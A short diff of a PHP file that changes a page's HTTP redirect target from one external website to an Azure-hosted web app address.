@@ -1,3 +1,3 @@
 <?php  
-  header("Location:https://serranosistemas.xyz/");
+  header("Location:https://justifica-tec-f7g7cnakg2czbccz.canadacentral-01.azurewebsites.net/");
 ?>
